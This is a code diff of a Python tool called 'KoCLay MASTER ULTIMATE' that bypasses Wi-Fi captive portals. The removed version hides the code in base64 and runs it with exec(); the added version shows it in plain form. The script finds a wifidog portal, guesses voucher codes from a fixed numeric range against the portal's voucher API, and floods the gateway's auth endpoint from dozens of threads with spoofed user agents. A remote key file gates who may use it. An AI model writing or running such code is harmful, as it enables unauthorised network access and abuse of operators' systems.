@@ -1,5 +1,151 @@
-import base64
-# KoCLay MASTER ULTIMATE - Protected Version
-_x = 'aW1wb3J0IHJlcXVlc3RzLCByZSwgdXJsbGliMywgdGltZSwgdGhyZWFkaW5nLCBvcywgcmFuZG9tLCBzdWJwcm9jZXNzLCBqc29uLCBzeXMsIHNvY2tldApmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgdXJscGFyc2UsIHBhcnNlX3FzLCB1cmxqb2luCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgp1cmxsaWIzLmRpc2FibGVfd2FybmluZ3ModXJsbGliMy5leGNlcHRpb25zLkluc2VjdXJlUmVxdWVzdFdhcm5pbmcpCgpWSVBfVVJMID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9wYWluZ2xpbnR1bjg5NS1yZ2IvbXkta2V5cy9tYWluL0tvY2xheS50eHQiClVTRVJfTkFNRSwgRVhQX0RBVEUsIEFVVEhPUklaRUQgPSAiTWUiLCAiLS0iLCBGYWxzZQpWT1VDSEVSX0xJU1QgPSBbc3RyKGkpIGZvciBpIGluIHJhbmdlKDEyMzQwMCwgMTIzNTAxKV0KCkFJX1NUQVRVUyA9ICJEaXNjb3ZlcnkiCkxBU1RfUElORyA9IDAKU1RPUF9USFJFQURTID0gdGhyZWFkaW5nLkV2ZW50KCkKCmRlZiBnZXRfYWR2YW5jZWRfaGVhZGVycygpOgogICAgYnJvd3NlcnMgPSBbCiAgICAgICAgZiJNb3ppbGxhLzUuMCAoaVBob25lOyBDUFUgaVBob25lIE9TIHtyYW5kb20ucmFuZGludCgxNSwxNyl9XzAgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE3LjAgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjEiLAogICAgICAgIGYiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIHtyYW5kb20ucmFuZGludCgxMSwxNCl9OyBTTS1HOTkxQikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIKICAgIF0KICAgIHJldHVybiB7CiAgICAgICAgIlVzZXItQWdlbnQiOiByYW5kb20uY2hvaWNlKGJyb3dzZXJzKSwKICAgICAgICAiQWNjZXB0IjogIiovKiIsCiAgICAgICAgIkNvbm5lY3Rpb24iOiAia2VlcC1hbGl2ZSIKICAgIH0KCmRlZiB1cGRhdGVfc3RhdHVzKCk6CiAgICBnbG9iYWwgVVNFUl9OQU1FLCBFWFBfREFURSwgQVVUSE9SSVpFRAogICAgdHJ5OgogICAgICAgIHVpZCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsnd2hvYW1pJ10pLmRlY29kZSgndXRmLTgnKS5zdHJpcCgpCiAgICAgICAgcmVzID0gcmVxdWVzdHMuZ2V0KGYie1ZJUF9VUkx9P2NiPXtyYW5kb20ucmFuZG9tKCl9IiwgdGltZW91dD03KQogICAgICAgIGlmIHJlcy5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIGZvciBsaW5lIGluIHJlcy50ZXh0LnNwbGl0bGluZXMoKToKICAgICAgICAgICAgICAgIGlmIHVpZCBpbiBsaW5lOgogICAgICAgICAgICAgICAgICAgIHBhcnRzID0gbGluZS5zcGxpdCgnfCcpCiAgICAgICAgICAgICAgICAgICAgdl9uYW1lLCBleHBfZHQgPSBwYXJ0c1sxXS5zdHJpcCgpLCBwYXJ0c1syXS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgVVNFUl9OQU1FLCBFWFBfREFURSwgQVVUSE9SSVpFRCA9IHZfbmFtZSwgZXhwX2R0LCBUcnVlCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQ6IHBhc3MKCmRlZiBiYW5uZXIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQoIlwwMzNbOTNtIiArICIgPSIqMzgpCiAgICBwcmludCgiXDAzM1s0M20gIFwwMzNbNDJtICBcMDMzWzQxbSAgXDAzM1swbSBcMDMzWzk2bSIgKyAiIEtvQ0xheSBNQVNURVIgVUxUSU1BVEUgVjMuNSAiICsgIlwwMzNbNDFtICBcMDMzWzQybSAgXDAzM1s0M20gIFwwMzNbMG0iKQogICAgcHJpbnQoIlwwMzNbOTZtIiArIHInJycKICAgIOKWiOKWiOKVlyAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICAgICAg4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAgIOKWiOKWiOKVlwogICAg4paI4paI4pWRIOKWiOKWiOKVlOKVneKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkSAgICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4paI4paI4pWXIOKWiOKWiOKVlOKVnQogICAg4paI4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4pWRICAgICDilojilojilojilojilojilojilojilZEg4pWa4paI4paI4paI4paI4pWU4pWdIAogICAg4paI4paI4pWU4pWQ4paI4paI4pWXIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4pWRICAgICDilojilojilZTilZDilZDilojilojilZEgIOKVmuKWiOKWiOKVlOKVnSAgCiAgICDilojilojilZEgIOKWiOKWiOKVl+KVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWRICAg4paI4paI4pWRICAgCiAgICDilZrilZDilZ0gIOKVmuKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0gIOKVmuKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWdICAgJycnKQogICAgcHJpbnQoZiJcMDMzWzk1bSDwn5GRIE1BU1RFUjoge1VTRVJfTkFNRX0gfCBcMDMzWzkybfCfk4UgRVhQOiB7RVhQX0RBVEV9IikKICAgIHByaW50KCJcMDMzWzkzbSA9IiozOCArICJcMDMzWzBtIikKCmRlZiBzaG93X3BpbmdfbGl2ZSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBpZiBMQVNUX1BJTkcgPiAwOgogICAgICAgICAgICBwX2NvbG9yID0gIlwwMzNbOTJtIiBpZiBMQVNUX1BJTkcgPCAxMTAgZWxzZSAiXDAzM1s5M20iIGlmIExBU1RfUElORyA8IDI1MCBlbHNlICJcMDMzWzkxbSIKICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyIFwwMzNbOTZtW35dIEFJOiB7QUlfU1RBVFVTfSB8IHtwX2NvbG9yfeKaoSBQSU5HOiB7TEFTVF9QSU5HfW1zICAgICAgICAgIFwwMzNbMG0iKQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuNSkKCmRlZiB0dXJib19wdWxzZShsaW5rLCBtb2RlKToKICAgIGdsb2JhbCBMQVNUX1BJTkcsIEFJX1NUQVRVUwogICAgcGF5bG9hZCA9ICJrb2NsYXkiICogNQogICAgd2hpbGUgbm90IFNUT1BfVEhSRUFEUy5pc19zZXQoKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHN0YXJ0ID0gdGltZS50aW1lKCkKICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KGxpbmssIHRpbWVvdXQ9NSwgdmVyaWZ5PUZhbHNlLCBoZWFkZXJzPWdldF9hZHZhbmNlZF9oZWFkZXJzKCksIHBhcmFtcz17J2RhdGEnOiBwYXlsb2FkfSkKICAgICAgICAgICAgTEFTVF9QSU5HID0gaW50KCh0aW1lLnRpbWUoKSAtIHN0YXJ0KSAqIDEwMDApCiAgICAgICAgICAgIEFJX1NUQVRVUyA9ICJTdGFibGUiIGlmIExBU1RfUElORyA8IDI1MCBlbHNlICJSZXNjdWUiCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgQUlfU1RBVFVTID0gIlJlc2N1ZSI7IHRpbWUuc2xlZXAoMC41KQoKZGVmIGxhdW5jaCgpOgogICAgZ2xvYmFsIEFJX1NUQVRVUywgU1RPUF9USFJFQURTCiAgICB1cGRhdGVfc3RhdHVzKCk7IGJhbm5lcigpCiAgICAKICAgIHByaW50KCJcMDMzWzkybSBbMV0g8J+noCBCYWxhbmNlZCBNb2RlICjnqanlrpopIikKICAgIHByaW50KCJcMDMzWzkxbSBbMl0g8J+UpSBUdXJibyBNb2RlICjliqDpgJ8pIikKICAgIGNob2ljZSA9IGlucHV0KCJcMDMzWzk3bVxuIFs/XSBTZWxlY3QgUG93ZXI6ICIpCiAgICB0aHJlYWRzID0gODAgaWYgY2hvaWNlID09ICIyIiBlbHNlIDUwCgogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2hvd19waW5nX2xpdmUsIGRhZW1vbj1UcnVlKS5zdGFydCgpCgogICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIFNUT1BfVEhSRUFEUy5jbGVhcigpCiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHA6Ly9jb25uZWN0aXZpdHljaGVjay5nc3RhdGljLmNvbS9nZW5lcmF0ZV8yMDQiLCB0aW1lb3V0PTgpCiAgICAgICAgICAgIHBfdXJsID0gci51cmwKICAgICAgICAgICAgcGFyc2VkID0gdXJscGFyc2UocF91cmwpCiAgICAgICAgICAgIAogICAgICAgICAgICBndyA9IHBhcnNlX3FzKHBhcnNlZC5xdWVyeSkuZ2V0KCdnd19hZGRyZXNzJywgW3BhcnNlZC5uZXRsb2Muc3BsaXQoJzonKVswXV0pWzBdCiAgICAgICAgICAgIGlmIG5vdCBndzogZ3cgPSBzb2NrZXQuZ2V0aG9zdGJ5bmFtZShwYXJzZWQubmV0bG9jKQogICAgICAgICAgICAKICAgICAgICAgICAgcjEgPSBzZXNzaW9uLmdldChwX3VybCwgdmVyaWZ5PUZhbHNlLCB0aW1lb3V0PTgsIGhlYWRlcnM9Z2V0X2FkdmFuY2VkX2hlYWRlcnMoKSkKICAgICAgICAgICAgbSA9IHJlLnNlYXJjaChyImxvY2F0aW9uXC5ocmVmXHMqPVxzKlsnXCJdKFteJ1wiXSspWydcIl0iLCByMS50ZXh0KQogICAgICAgICAgICBuX3VybCA9IHVybGpvaW4ocF91cmwsIG0uZ3JvdXAoMSkpIGlmIG0gZWxzZSBwX3VybAogICAgICAgICAgICAKICAgICAgICAgICAgcjIgPSBzZXNzaW9uLmdldChuX3VybCwgdmVyaWZ5PUZhbHNlLCB0aW1lb3V0PTgsIGhlYWRlcnM9Z2V0X2FkdmFuY2VkX2hlYWRlcnMoKSkKICAgICAgICAgICAgc2lkID0gcGFyc2VfcXModXJscGFyc2UocjIudXJsKS5xdWVyeSkuZ2V0KCdzZXNzaW9uSWQnLCBbTm9uZV0pWzBdCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBzaWQ6CiAgICAgICAgICAgICAgICB2X2NvZGUgPSByYW5kb20uY2hvaWNlKFZPVUNIRVJfTElTVCkKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkgCiAgICAgICAgICAgICAgICBzZXNzaW9uLnBvc3QoZiJ7cGFyc2VkLnNjaGVtZX06Ly97cGFyc2VkLm5ldGxvY30vYXBpL2F1dGgvdm91Y2hlci8iLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBqc29uPXsnYWNjZXNzQ29kZSc6IHZfY29kZSwgJ3Nlc3Npb25JZCc6IHNpZCwgJ2FwaVZlcnNpb24nOiAxfSwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZW91dD01LCBoZWFkZXJzPWdldF9hZHZhbmNlZF9oZWFkZXJzKCkpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGF1dGhfbGluayA9IGYiaHR0cDovL3tnd306MjA2MC93aWZpZG9nL2F1dGg/dG9rZW49e3NpZH0iCiAgICAgICAgICAgICAgICBwcmludChmIlxuXDAzM1s5Mm1bKl0g4pqhIEJZUEFTUyBTVUNDRVNTISDimqFcMDMzWzBtIikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UodGhyZWFkcyk6CiAgICAgICAgICAgICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9dHVyYm9fcHVsc2UsIGFyZ3M9KGF1dGhfbGluaywgY2hvaWNlKSwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGMgPSByZXF1ZXN0cy5nZXQoImh0dHA6Ly93d3cuZ29vZ2xlLmNvbS9nZW5lcmF0ZV8yMDQiLCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGMuc3RhdHVzX2NvZGUgIT0gMjA0OiByYWlzZSBFeGNlcHRpb24oIk9mZiIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBBSV9TVEFUVVMgPSAiUmVzY3VlIjsgYnJlYWsKICAgICAgICAgICAgICAgIFNUT1BfVEhSRUFEUy5zZXQoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgQUlfU1RBVFVTID0gIkRpc2NvdmVyeSI7IHRpbWUuc2xlZXAoMikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIEFJX1NUQVRVUyA9ICJSZXNjdWUiOyB0aW1lLnNsZWVwKDIpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgdHJ5OiBsYXVuY2goKQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OiBzeXMuZXhpdCgpCg=='
-exec(base64.b64decode(_x).decode('utf-8'))
+import requests, re, urllib3, time, threading, os, random, subprocess, json, sys, socket
+from urllib.parse import urlparse, parse_qs, urljoin
+from datetime import datetime
 
+# Disable insecure request warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Configuration - Updated to your repository
+VIP_URL = "https://raw.githubusercontent.com/ShineLiveTV/my-keys-main/main/Koclay.txt"
+USER_NAME, EXP_DATE, AUTHORIZED = "Me", "--", False
+VOUCHER_LIST = [str(i) for i in range(123400, 123501)]
+
+AI_STATUS = "Discovery"
+LAST_PING = 0
+STOP_THREADS = threading.Event()
+
+def get_advanced_headers():
+    browsers = [
+        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+        f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
+    ]
+    return {
+        "User-Agent": random.choice(browsers),
+        "Accept": "*/*",
+        "Connection": "keep-alive"
+    }
+
+def update_status():
+    global USER_NAME, EXP_DATE, AUTHORIZED
+    try:
+        # Get Termux/Linux user ID
+        uid = subprocess.check_output(['whoami']).decode('utf-8').strip()
+        res = requests.get(f"{VIP_URL}?cb={random.random()}", timeout=7)
+        if res.status_code == 200:
+            for line in res.text.splitlines():
+                if uid in line:
+                    parts = line.split('|')
+                    v_name, exp_dt = parts[1].strip(), parts[2].strip()
+                    USER_NAME, EXP_DATE, AUTHORIZED = v_name, exp_dt, True
+                    return
+    except:
+        pass
+
+def banner():
+    os.system('clear')
+    print("\033[93m" + "="*38)
+    print("\033[43m  \033[42m  \033[41m  \033[0m \033[96m" + " KoCLay MASTER ULTIMATE V3.5 " + "\033[41m  \033[42m  \033[43m  \033[0m")
+    print("\033[96m" + r'''
+    █▄  █▄  ██████  ███████  █▄      █████  █▄   █▄
+    ██  █  █  █      █      █  █     █  █  █  █  █  
+    █████  █   ███   ███     █     ███████  █████  
+    █  ██  █   █      █      █     █  █  █  █  █  
+    █  █  █  ██████  ██████  █▄  █  █  █  █  
+    ''')
+    print(f"\033[95m 👑 MASTER: {USER_NAME} | \033[92m📅 EXP: {EXP_DATE}")
+    print("\033[93m" + "="*38 + "\033[0m")
+
+def show_ping_live():
+    while True:
+        if LAST_PING > 0:
+            p_color = "\033[92m" if LAST_PING < 110 else "\033[93m" if LAST_PING < 250 else "\033[91m"
+            sys.stdout.write(f"\r \033[96m[~] AI: {AI_STATUS} | {p_color}⚡ PING: {LAST_PING}ms          \033[0m")
+            sys.stdout.flush()
+        time.sleep(0.5)
+
+def turbo_pulse(link, mode):
+    global LAST_PING, AI_STATUS
+    payload = "koclay" * 5
+    while not STOP_THREADS.is_set():
+        try:
+            start = time.time()
+            requests.get(link, timeout=5, verify=False, headers=get_advanced_headers(), params={'data': payload})
+            LAST_PING = int((time.time() - start) * 1000)
+            AI_STATUS = "Stable" if LAST_PING < 250 else "Rescue"
+            time.sleep(0.1)
+        except:
+            AI_STATUS = "Rescue"; time.sleep(0.5)
+
+def launch():
+    global AI_STATUS, STOP_THREADS
+    update_status()
+    banner()
+    
+    print("\033[92m [1] 🧠 Balanced Mode (穩定) \033[0m")
+    print("\033[91m [2] 🔥 Turbo Mode (加速) \033[0m")
+    choice = input("\033[97m\n [?] Select Power: ")
+    threads = 80 if choice == "2" else 50
+
+    threading.Thread(target=show_ping_live, daemon=True).start()
+
+    session = requests.Session()
+    print(f"\n\033[93m[*] Starting engine with {threads} threads...\033[0m")
+    
+    while True:
+        try:
+            STOP_THREADS.clear()
+            # Check for captive portal
+            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=8)
+            p_url = r.url
+            parsed = urlparse(p_url)
+            
+            # If redirected, we found a login page
+            if "generate_204" not in p_url:
+                print(f"\033[96m[*] Found portal: {parsed.netloc}\033[0m")
+                
+                gw = parse_qs(parsed.query).get('gw_address', [parsed.netloc.split(':')[0]])[0]
+                if not gw: gw = socket.gethostbyname(parsed.netloc)
+                
+                r1 = session.get(p_url, verify=False, timeout=8, headers=get_advanced_headers())
+                m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+                n_url = urljoin(p_url, m.group(1)) if m else p_url
+                
+                r2 = session.get(n_url, verify=False, timeout=8, headers=get_advanced_headers())
+                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+                
+                if sid:
+                    v_code = random.choice(VOUCHER_LIST)
+                    time.sleep(1) 
+                    session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", 
+                                json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, 
+                                timeout=5, headers=get_advanced_headers())
+                    
+                    auth_link = f"http://{gw}:2060/wifidog/auth?token={sid}"
+                    print(f"\n\033[92m[*] ⚡ BYPASS SUCCESS! ⚡\033[0m")
+                    
+                    for _ in range(threads):
+                        threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
+                    
+                    while True:
+                        time.sleep(0.5)
+                        try:
+                            c = requests.get("http://www.google.com/generate_204", timeout=5)
+                            if c.status_code != 204: raise Exception("Off")
+                        except:
+                            AI_STATUS = "Rescue"; break
+                    STOP_THREADS.set()
+                else:
+                    AI_STATUS = "Discovery"; time.sleep(2)
+            else:
+                # No redirect, already have internet
+                AI_STATUS = "Online"; 
+                sys.stdout.write(f"\r \033[92m[*] You are already connected to the internet. Monitoring...\033[0m")
+                sys.stdout.flush()
+                time.sleep(5)
+                
+        except Exception as e:
+            AI_STATUS = "Rescue"; time.sleep(2)
+
+if __name__ == "__main__":
+    try: launch()
+    except KeyboardInterrupt: sys.exit()
